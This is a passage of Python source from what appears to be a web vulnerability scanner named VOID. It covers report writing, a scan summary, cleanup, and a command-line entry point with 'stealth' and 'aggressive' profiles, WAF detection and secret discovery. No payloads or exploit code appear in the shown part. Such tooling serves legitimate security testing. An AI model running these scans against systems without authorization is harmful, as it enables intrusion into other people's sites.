                writer.writerow([vuln.get('severity', ''), vuln.get('type', ''), vuln.get('url', ''), vuln.get('parameter', ''), vuln.get('confidence', 0), vuln.get('evidence', '')[:100] + '...' if len(vuln.get('evidence', '')) > 100 else vuln.get('evidence', '')])
        self.logger.info(f'CSV report generated: {filename}')
        return str(filename)

    async def _generate_markdown_report(self, results: Dict, filename: Path) -> str:
        md = f"# VOID\n\n**Target:** {results['target']}\n**Scan Date:** {results['start_time']}\n**Duration:** {results.get('duration', 0):.2f} seconds\n**Profile:** {results.get('profile', 'standard')}\n\n## Summary\n\n- **URLs Crawled:** {len(results.get('urls_crawled', []))}\n- **Parameters:** {len(results.get('parameters', []))}\n- **Vulnerabilities:** {len(results.get('vulnerabilities', []))}\n- **Secrets:** {len(results.get('secrets', []))}\n\n## Vulnerabilities\n\n"
        for severity in ['Critical', 'High', 'Medium', 'Low', 'Info']:
            vulns = [v for v in results.get('vulnerabilities', []) if v.get('severity', '').upper() == severity.upper()]
            if vulns:
                md += f'### {severity} ({len(vulns)})\n\n'
                for vuln in vulns:
                    md += f"#### {vuln.get('type', 'Unknown')}\n"
                    md += f"- **URL:** {vuln.get('url', 'N/A')}\n"
                    md += f"- **Parameter:** {vuln.get('parameter', 'N/A')}\n"
                    md += f"- **Evidence:** {vuln.get('evidence', 'N/A')}\n"
                    md += f"- **Confidence:** {vuln.get('confidence', 0)}%\n"
                    md += f"- **Risk Score:** {vuln.get('risk_score', 0)}/10\n\n"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(md)
        self.logger.info(f'Markdown report generated: {filename}')
        return str(filename)

    def print_summary(self, results: Dict):
        print('\n' + '=' * 60)
        print('SCAN SUMMARY')
        print('=' * 60)
        print(f"Target: {results['target']}")
        print(f"Duration: {results.get('duration', 0):.2f} seconds")
        print(f"URLs Crawled: {len(results.get('urls_crawled', []))}")
        print(f"Parameters: {len(results.get('parameters', []))}")
        print(f"\nVulnerabilities: {len(results.get('vulnerabilities', []))}")
        severity_counts = defaultdict(int)
        for vuln in results.get('vulnerabilities', []):
            severity_counts[vuln.get('severity', 'Info')] += 1
        for severity in ['Critical', 'High', 'Medium', 'Low', 'Info']:
            if severity_counts[severity] > 0:
                print(f'  {severity}: {severity_counts[severity]}')
        print(f"\nSecrets Found: {len(results.get('secrets', []))}")
        if results.get('waf', {}).get('detected'):
            print(f"\nWAF Detected: {', '.join(results['waf'].get('wafs', []))}")
        if results.get('technologies'):
            print('\nTechnologies:')
            summary = self.tech_fingerprinter.get_summary(results['technologies'])
            print(summary)
        print('=' * 60)

    async def close(self):
        if self.async_scanner:
            await self.async_scanner.close()
        if self.database:
            self.database.close()

    async def release_async_clients(self):
        if self.async_scanner:
            try:
                await self.async_scanner.close()
            except Exception as e:
                self.logger.debug('release_async_clients close: %s', e)
        self.async_scanner = None
        self.crawler = None
        self.fuzzing_engine = None
        self.waf_detector = None
        self.tech_fingerprinter = None
        self.js_analyzer = None
        self.target_profiler = None

    def run_gui(self):
        if self.gui:
            self.gui.set_scanner(self)
            self.gui.show()
            return self.gui
        return None

async def async_main():
    parser = argparse.ArgumentParser(description=f'VOID {Config.VERSION} — web security scanner', formatter_class=argparse.RawDescriptionHelpFormatter, epilog='Examples:  python void.py --gui   |   python void.py https://example.com --profile standard')
    parser.add_argument('url', nargs='?', help='Target URL to scan')
    parser.add_argument('--gui', action='store_true', help='Launch GUI mode')
    parser.add_argument('--profile', choices=['quick', 'standard', 'deep', 'stealth', 'aggressive', 'api'], default='standard', help='Scan profile')
    parser.add_argument('--threads', type=int, help='Number of threads')
    parser.add_argument('--depth', type=int, help='Crawl depth')
    parser.add_argument('--timeout', type=int, help='Request timeout')
    parser.add_argument('--remote', action='store_true', help='Use model-assisted analysis (needs AI_ANALYZER_ENABLED + API key in config/env)')
    parser.add_argument('--output', '-o', help='Output file for report')
    parser.add_argument('--format', choices=['html', 'json', 'csv', 'markdown', 'pdf'], default='html', help='Report format')
    parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
    parser.add_argument('--quiet', '-q', action='store_true', help='Quiet mode')
    parser.add_argument('--version', action='version', version=f'VOID {Config.VERSION}')
    args = parser.parse_args()

    def signal_handler(sig, frame):
        print('\n\n[!] Interrupted by user')
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)
    if args.gui or not args.url:
        from PyQt5.QtWidgets import QApplication
        from PyQt5.QtGui import QFont
        app = QApplication(sys.argv)
        app.setStyle('Fusion')
        app.setFont(QFont(Config.GUI_FONT, Config.GUI_FONT_SIZE))
        window = VoidStrikeApplication(gui_mode=True)
        gui = window.run_gui()
        if gui:
            sys.exit(app.exec_())
        else:
            print('Failed to create GUI')
            sys.exit(1)
    else:
        print(f'VOID {Config.VERSION}\n')
        app = VoidStrikeApplication(gui_mode=False)
        try:
            await app.initialize()
            print(f'Target: {args.url}')
            print(f'Profile: {args.profile}')
            print(f"Model-assisted: {('on' if args.remote else 'off')}")
            print('-' * 48)
            results = await app.scan(args.url, args.profile, {'use_remote_analysis': args.remote})
            if args.output:
                report_path = args.output
            else:
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                report_path = f'voidstrike_report_{timestamp}.{args.format}'
            print(f'\n[+] Generating {args.format.upper()} report: {report_path}')
            await app.generate_report(results, args.format)
            app.print_summary(results)
        except KeyboardInterrupt:
            print('\n\n[!] Scan interrupted by user')
        except Exception as e:
            print(f'\n[!] Error: {e}')
            if args.verbose:
                import traceback
                traceback.print_exc()
        finally:
            await app.close()

def main():
    Config.initialize()
    Config.load()
    asyncio.run(async_main())
if __name__ == '__main__':
    main()
